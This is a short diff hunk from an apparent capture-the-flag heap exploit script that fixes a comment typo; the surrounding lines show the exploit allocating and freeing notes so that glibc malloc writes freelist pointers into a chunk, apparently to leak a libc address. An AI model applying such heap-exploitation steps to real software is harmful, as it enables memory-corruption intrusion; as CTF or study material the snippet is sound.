@@ -99,7 +99,7 @@ if __name__ == "__main__":
 
     r.recvuntil('Your choice:')
 
-    new_note(p32(0xdeadbeef)) # alloc two chunk and delete the first one
+    new_note(p32(0xdeadbeef)) # alloc two chunks and delete the first one
     new_note(p32(0xdeadbeef))
 
     delete_note(0) # glibc malloc manager will write fd/bk pointer into the chunk which point somewhere in libc area
